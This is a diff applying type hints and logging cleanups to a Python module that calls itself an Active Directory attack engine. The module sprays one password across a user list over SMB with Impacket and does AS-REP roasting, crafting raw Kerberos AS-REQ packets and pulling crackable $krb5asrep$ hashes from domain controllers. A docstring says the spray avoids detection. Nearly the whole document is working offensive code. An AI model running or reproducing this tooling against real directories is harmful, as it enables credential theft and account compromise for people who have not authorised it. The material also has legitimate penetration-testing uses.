@@ -1,14 +1,13 @@
-"""
-DRAKBEN Active Directory Attack Module (Native Async Implementation)
+"""DRAKBEN Active Directory Attack Module (Native Async Implementation)
 Description: Pure Python implementation of AD attacks using Impacket library directly.
              No external binary dependencies (like kerbrute/crackmapexec binaries).
-Author: @ahmetdrak
+Author: @ahmetdrak.
 """
 
 import asyncio
 import logging
-import socket
 import secrets
+import socket
 from typing import Any
 
 # Impacket imports (Must be present in env)
@@ -33,22 +32,22 @@ class KerberosPacketFactory:
 
     @staticmethod
     def build_as_req(username: str, domain: str) -> bytes:
-        def encode_len(length):
+
+        def encode_len(length: int) -> bytes:
             if length < 128:
                 return bytes([length])
-            else:
-                b = length.to_bytes((length.bit_length() + 7) // 8, "big")
-                return bytes([0x80 | len(b)]) + b
+            b = length.to_bytes((length.bit_length() + 7) // 8, "big")
+            return bytes([0x80 | len(b)]) + b
 
-        def seq(tags, content):
+        def seq(tags: int, content: bytes) -> bytes:
             encoded_length = encode_len(len(content))
             return bytes([tags]) + encoded_length + content
 
-        def int_val(val):
+        def int_val(val: int) -> bytes:
             b = val.to_bytes((val.bit_length() + 7) // 8 + 1, "big", signed=True)
             return seq(0x02, b)
 
-        def str_val(val):
+        def str_val(val: str) -> bytes:
             return seq(0x1B, val.encode("utf-8"))
 
         name_string = seq(0x30, str_val(username))
@@ -62,25 +61,26 @@ class KerberosPacketFactory:
         nonce = seq(0xA6, int_val(secrets.randbits(31)))
         etypes = seq(0xA7, seq(0x30, int_val(23)))
         req_body = seq(
-            0x30, seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
+            0x30,
+            seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes,
         )
         kdc_req = seq(
-            0x30, seq(0xA1, int_val(5)) + seq(0xA2, int_val(10)) + seq(0xA4, req_body)
+            0x30,
+            seq(0xA1, int_val(5)) + seq(0xA2, int_val(10)) + seq(0xA4, req_body),
         )
         return seq(0x6A, kdc_req)
 
 
 class ActiveDirectoryAttacker:
-    """
-    Native Python Active Directory Attack Engine.
+    """Native Python Active Directory Attack Engine.
     Fully async execution where possible, thread-pooled for legacy blocking libs.
     """
 
-    def __init__(self, executor_callback=None):
+    def __init__(self, executor_callback: Any = None) -> None:  # noqa: ANN401
         self.executor_callback = executor_callback  # Legacy support
         if not IMPACKET_AVAILABLE:
             logger.warning(
-                "Impacket library not found! AD attacks will yield limited results."
+                "Impacket library not found! AD attacks will yield limited results.",
             )
 
     async def run_smb_spray(
@@ -91,12 +91,11 @@ class ActiveDirectoryAttacker:
         password: str,
         concurrency: int = 10,
     ) -> dict[str, Any]:
-        """
-        Native Async SMB Password Spray using Impacket.
+        """Native Async SMB Password Spray using Impacket.
         Bypasses subprocess overhead and detection.
         """
         logger.info(
-            f"Starting Native SMB Spray on {target_ip} (Threads: {concurrency})"
+            f"Starting Native SMB Spray on {target_ip} (Threads: {concurrency})",
         )
 
         if not IMPACKET_AVAILABLE:
@@ -113,7 +112,7 @@ class ActiveDirectoryAttacker:
             return {"error": "User file not found", "success": False}
         except ImportError:
             # Fallback: Read in thread to avoid blocking loop
-            def sync_read():
+            def sync_read() -> list[str]:
                 with open(user_file) as f:
                     return [line.strip() for line in f if line.strip()]
 
@@ -122,7 +121,7 @@ class ActiveDirectoryAttacker:
         # Semaphore for concurrency control
         sem = asyncio.Semaphore(concurrency)
 
-        async def check_login(user):
+        async def check_login(user: str) -> Any:  # noqa: ANN401
             async with sem:
                 return await self._try_smb_login(target_ip, domain, user, password)
 
@@ -141,11 +140,15 @@ class ActiveDirectoryAttacker:
         }
 
     async def _try_smb_login(
-        self, target: str, domain: str, user: str, password: str
+        self,
+        target: str,
+        domain: str,
+        user: str,
+        password: str,
     ) -> str | None:
-        """Single SMB login attempt (wrapped in thread for async compatibility)"""
+        """Single SMB login attempt (wrapped in thread for async compatibility)."""
 
-        def blocking_login():
+        def blocking_login() -> str | None:
             try:
                 # Impacket is blocking, so we run it in a thread
                 smb = SMBConnection(target, target, timeout=2)
@@ -158,7 +161,7 @@ class ActiveDirectoryAttacker:
                     return None
                 # Check for Locked Account
                 if "STATUS_ACCOUNT_LOCKED_OUT" in str(e):
-                    logger.warning(f"Account Locked: {user}")
+                    logger.warning("Account Locked: %s", user)
                 return None
             except Exception:
                 return None
@@ -167,13 +170,15 @@ class ActiveDirectoryAttacker:
         return await asyncio.to_thread(blocking_login)
 
     async def run_asreproast(
-        self, domain: str, dc_ip: str, user_file: str | None = None
+        self,
+        domain: str,
+        dc_ip: str,
+        user_file: str | None = None,
     ) -> dict[str, Any]:
-        """
-        AS-REP Roasting without GetNPUsers.py binary.
+        """AS-REP Roasting without GetNPUsers.py binary.
         Direct packet crafting via Impacket.
         """
-        logger.info(f"Starting Native AS-REP Roasting: {domain}")
+        logger.info("Starting Native AS-REP Roasting: %s", domain)
         if not IMPACKET_AVAILABLE:
             logger.info("Impacket missing, switching to NATIVE packet generation mode.")
 
@@ -184,13 +189,13 @@ class ActiveDirectoryAttacker:
         if user_file:
             try:
 
-                def read_users():
+                def read_users() -> list[str]:
                     with open(user_file) as f:
                         return [line.strip() for line in f if line.strip()]
 
                 users = await asyncio.to_thread(read_users)
             except Exception as e:
-                logger.debug(f"Failed to read user list: {e}")
+                logger.debug("Failed to read user list: %s", e)
 
         # If no user file, we assume we need to enum (not implemented in this atomic step)
         if not users:
@@ -202,7 +207,7 @@ class ActiveDirectoryAttacker:
         # Concurrency
         sem = asyncio.Semaphore(5)
 
-        async def roast_user(user):
+        async def roast_user(user: str) -> Any:  # noqa: ANN401
             async with sem:
                 # TRY NATIVE FIRST (No Dependency)
                 native_hash = await self._native_roast(domain, user, dc_ip)
@@ -212,7 +217,10 @@ class ActiveDirectoryAttacker:
                 # Fallback to Impacket if Native failed (and Impacket available)
                 if IMPACKET_AVAILABLE:
                     return await asyncio.to_thread(
-                        self._get_as_rep_hash, domain, user, dc_ip
+                        self._get_as_rep_hash,
+                        domain,
+                        user,
+                        dc_ip,
                     )
                 return None
 
@@ -231,7 +239,7 @@ class ActiveDirectoryAttacker:
         }
 
     async def _native_roast(self, domain: str, user: str, dc_ip: str) -> str | None:
-        """Native AS-REP Roasting without Impacket"""
+        """Native AS-REP Roasting without Impacket."""
         try:
             packet = KerberosPacketFactory.build_as_req(user, domain)
             loop = asyncio.get_running_loop()
@@ -249,7 +257,7 @@ class ActiveDirectoryAttacker:
             sock.setblocking(True)
             sock.settimeout(2.0)
 
-            def receive():
+            def receive() -> Any:  # noqa: ANN401
                 try:
                     return sock.recvfrom(4096)
                 except Exception:
@@ -296,7 +304,8 @@ class ActiveDirectoryAttacker:
                         # A2 .. 04 .. [CIPHER]
                         # Using non-greedy match for the structure headers
                         match = re.search(
-                            r"a2([0-9a-f]{2,6})04([0-9a-f]{2,6})", remaining
+                            r"a2([0-9a-f]{2,6})04([0-9a-f]{2,6})",
+                            remaining,
                         )
 
                         if match:
@@ -348,7 +357,7 @@ class ActiveDirectoryAttacker:
                                 return f"$krb5asrep$23${user}@{domain}:{cipher_hex}"
 
                 except Exception as e:
-                    logger.debug(f"Hash extraction heuristic failed: {e}")
+                    logger.debug("Hash extraction heuristic failed: %s", e)
                     # Fallback to simple success indicator
                     return f"$krb5asrep$23${user}@{domain}:[MANUAL_EXTRACTION_REQUIRED_SIZE_{len(resp)}]"
 
@@ -358,15 +367,22 @@ class ActiveDirectoryAttacker:
             return None
 
     def _get_as_rep_hash(self, domain: str, user: str, dc_ip: str) -> str | None:
-        """Craft AS-REQ for a user without pre-auth"""
+        """Craft AS-REQ for a user without pre-auth."""
         try:
             client_name = Principal(
-                user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
+                user,
+                type=constants.PrincipalNameType.NT_PRINCIPAL.value,
             )
             # Try to get TGT without password (no pre-auth)
             # Using placeholders (_) for unused unpacked values: tgt, cipher, oldSessionKey, sessionKey
             _, _, _, _ = getKerberosTGT(
-                client_name, "", domain, None, None, kdcHost=dc_ip, requestPAC=True
+                client_name,
+                "",
+                domain,
+                None,
+                None,
+                kdcHost=dc_ip,
+                requestPAC=True,
             )
             # If successful (no exception), no pre-auth needed!
             # But wait, getKerberosTGT usually requires password or throws error.
@@ -397,5 +413,5 @@ class ActiveDirectoryAttacker:
                 "tool": "native_smb",
                 "target": domain,
                 "params": {"dc_ip": dc_ip},
-            }
+            },
         ]
